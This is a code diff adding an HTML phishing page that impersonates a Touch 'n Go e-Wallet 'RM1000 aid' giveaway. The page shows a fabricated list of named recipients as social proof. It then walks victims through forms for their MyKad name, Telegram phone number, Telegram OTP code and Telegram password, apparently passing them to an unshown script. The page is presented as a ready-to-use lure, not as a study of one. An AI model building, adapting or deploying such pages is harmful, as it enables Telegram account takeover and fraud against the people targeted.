@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Claim Now Bantuan e-Wallet Touch n Go RM 1000</title>
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <style>
+      /* Loading screen */
+      #loading {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      #loading img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      .loading-screen {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.8);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+
+      .loading-screen img {
+        max-width: 100px;
+        max-height: 100px;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body,
+      html {
+        height: 100%;
+        width: 100%;
+      }
+
+      .hero {
+        height: 100vh;
+        width: 100%;
+        background-color: #fff;
+        position: relative;
+      }
+
+      /* Navbar */
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #fff;
+        padding: 10px 10px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        z-index: 9999;
+      }
+
+      .navbar .navbar-nav {
+        display: flex;
+        align-items: center;
+        justify-content: flex-end;
+        flex-wrap: nowrap;
+      }
+
+      .navbar .navbar-nav a {
+        color: #010101;
+        font-weight: bold;
+        font-size: 24px;
+        margin: auto;
+        padding: 5px;
+        text-decoration: none;
+        white-space: nowrap;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      /* Images */
+      img {
+        width: 350px;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+      }
+
+      img[src="img1.jpeg"] {
+        margin-top: 50px;
+      }
+
+      /* Form styles */
+      .form-container {
+        justify-content: center;
+        background-color: white;
+        padding: 10px;
+        border-radius: 10px;
+        width: 80%;
+        margin: 10px auto;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        margin-bottom: 80px;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100% !important;
+        padding: 10px 45px !important;
+        margin-bottom: 20px !important;
+        border: 1px solid #010101;
+        border-radius: 5px;
+        font-size: 13px;
+        transition: border-color 0.3s ease;
+      }
+
+      .btn {
+        display: flex;
+        width: 50%;
+        padding: 12px;
+        margin: 10px auto;
+        background-color: #f8d704;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 1.1rem;
+        cursor: pointer;
+        justify-content: center;
+      }
+
+      .btn:hover {
+        background-color: #225786;
+      }
+
+      /* Info text */
+      .info {
+        font-size: 20px;
+        color: black;
+        text-align: center;
+        margin: 20px 0 30px;
+      }
+
+      .info span {
+        color: #f8d704;
+        font-weight: bold;
+      }
+
+      p {
+        font-size: 20px;
+        color: #f8d704;
+        text-align: center;
+        margin: 5px 0;
+        font-weight: bold;
+      }
+
+      h4 {
+        color: #f8d704;
+        text-align: center;
+        font-size: 25px;
+        margin: 5px auto 0;
+      }
+
+      /* Record box */
+      ._record-box {
+        width: 90%;
+        max-width: 500px;
+        margin: 5px auto 5px;
+        background: #ffffff;
+        border-radius: 10px;
+        padding: 5px;
+        margin-top: 30px;
+        margin-bottom: 60px;
+      }
+
+      .list-box {
+        max-height: 329.6px;
+        overflow-y: auto;
+        scrollbar-width: none; /* Untuk Firefox */
+        -ms-overflow-style: none; /* Untuk Internet Explorer dan Edge */
+      }
+
+      .list-box::-webkit-scrollbar {
+        display: none; /* Untuk Chrome, Safari dan Opera */
+      }
+
+      .list .item {
+        display: flex;
+        align-items: center;
+        padding: 5px;
+        border: 1px solid #f8d704;
+        border-radius: 5px;
+      }
+
+      .record_logo {
+        width: 30px;
+        height: 30px;
+        margin-right: 10px;
+        margin-left: 5px;
+      }
+
+      .record_logo img {
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+      }
+
+      .center {
+        flex: 1;
+      }
+
+      .center .h1 {
+        color: var(--text-white);
+        font-size: 12px;
+        margin-bottom: 4px;
+      }
+
+      .center .h2 {
+        color: var(--accent-yellow);
+        font-size: 14px;
+        font-weight: bold;
+      }
+
+      /* Perbaikan untuk input telepon */
+      .iti {
+        width: 100% !important;
+        margin-bottom: 20px;
+      }
+
+      .iti__flag-container {
+        z-index: 1;
+      }
+
+      input[type="tel"] {
+        width: 100% !important;
+        padding: 10px 45px !important;
+        margin-bottom: 0 !important;
+        border: 1px solid #010101;
+        border-radius: 5px;
+        font-size: 13px;
+        transition: border-color 0.3s ease;
+      }
+
+      /* Footer */
+      footer {
+        position: fixed;
+        left: 0;
+        bottom: 0;
+        width: 100%;
+        background-color: #fff;
+        text-align: center;
+      }
+
+      footer img {
+        max-width: 350px;
+        height: auto;
+      }
+
+      /* Media Queries */
+      @media (max-width: 768px) {
+        .form-container {
+          width: 90%;
+          padding: 15px;
+        }
+
+        .btn {
+          width: 60%;
+        }
+
+        .info {
+          font-size: 18px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .info {
+          font-size: 15px;
+        }
+
+        .btn {
+          width: 80%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Loading Screen -->
+    <div id="loading" class="loading-screen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h3 class="info">
+          CLAIM SEKARANG NI TUK DAPATKAN <span>RM1000</span> <br />KAT E-WALLET
+          ANDA
+        </h3>
+        <p>Bantuan e-Wallet RM1000</p>
+        <div class="container">
+          <button class="btn" onclick="showPage('pendaftaranContent')">
+            CLAIM NOW
+          </button>
+        </div>
+
+        <!-- Record Box -->
+        <div class="_record-box">
+          <div id="list" class="list-box">
+            <div class="list">
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Ahmad Zulkifli</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Zarina Muhammad</span>
+                  </div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Iskandar Zainal</span>
+                  </div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Rohani Latiff</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Shahrul Nizam</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Norazman Hashim</span>
+                  </div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Farah Abdul</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Zulkifli Ibrahim</span>
+                  </div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Siti Sarah</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Muhammad Fahmi</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Nurul Afiqah</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Azhar Abdullah</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Hasnah Abdul</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Rahim Salleh</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Nadia Hafiz</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Fariz Musa</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Rina Zainal</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Amir Rahman</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Norshila Anuar</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Zainuddin Ali</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1">
+                    <span class="name">Fauzi Abdul Rahman</span>
+                  </div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Lina Mohd Noor</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+              <div class="item">
+                <div class="record_logo">
+                  <img src="avatar.png" alt="" />
+                </div>
+                <div class="center">
+                  <div class="h1"><span class="name">Ismail Zaid</span></div>
+                  <div class="h2">RM1000 ✅</div>
+                  <!-- Ubah jadi RM1000 -->
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Pendaftaran Content -->
+    <div id="pendaftaranContent" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h3 class="info">
+          CLAIM GUNA AKAUN TELEGRAM ANDA TUK DAPATKAN <span>RM1000</span>
+          <br />KAT E-WALLET ANDA
+        </h3>
+        <h4>CLAIM RM 1000 NOW</h4>
+
+        <div class="form-container">
+          <form id="registrationForm">
+            <input
+              type="text"
+              id="name"
+              name="name"
+              placeholder="Nama Penuh Sesuai MyKad"
+              required
+            />
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="+60 Phone nombor Telegram"
+              required
+            />
+            <button type="submit" class="btn">CLAIM NOW</button>
+          </form>
+        </div>
+
+        <!-- <img src="img3.jpeg" alt="tng-img" /> -->
+      </div>
+    </div>
+
+    <!-- Kode OTP Content -->
+    <div id="kodeContent" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+        <h3 class="info">
+          Sila Masukkan kode OTP yang kami hantar ke pesan
+          <span>Telegram Anda.</span>
+        </h3>
+        <h4>CLAIM RM 1000 NOW</h4>
+
+        <div class="form-container">
+          <form id="otpForm">
+            <label for="otp">Masukkan Kod-OTP</label>
+            <input
+              type="tel"
+              id="otp"
+              name="otp"
+              placeholder="Masukkan 5 digit OTP"
+              required
+              maxlength="5"
+            />
+            <button type="submit" class="btn">Teruskan</button>
+          </form>
+        </div>
+
+        <!-- <img src="img3.jpeg" alt="tng-img" /> -->
+      </div>
+    </div>
+
+    <!-- Kata Sandi Content -->
+    <div id="kataSandiContent" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-nav">
+          <a href="#">Bantuan e Wallet Touch n Go</a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <br />
+        <br />
+        <img src="img-22.jpeg" alt="tng-img" />
+
+        <h3 class="info">
+          Sila masukkan kata sandi <span>Telegram Anda.</span>
+        </h3>
+        <h4>CLAIM RM 1000 NOW</h4>
+
+        <div class="form-container">
+          <p id="kataSandi">Sila Masukkan kata laluan Telegram Anda</p>
+          <form id="passwordForm">
+            <input
+              type="password"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukkan kata laluan Awak"
+              required
+            />
+            <button type="submit" class="btn" id="loginButton">Teruskan</button>
+          </form>
+
+          <img
+            id="loadingGif"
+            src="processing.gif"
+            alt="Loading..."
+            style="display: none; margin: 20px auto; width: 60%"
+          />
+          <p id="formMessage" style="display: none">
+            sila tunggu proses pengesahan atau
+          </p>
+          <button id="useAnotherPhone" style="display: none" class="btn">
+            Gunakan Nombor Telefon Lain
+          </button>
+        </div>
+
+        <!-- <img src="img3.jpeg" alt="tng-img" /> -->
+      </div>
+    </div>
+
+    <footer>
+      <img src="ini1.png" alt="Logo Footer" />
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+    <script src="java.js"></script>
+  </body>
+</html>
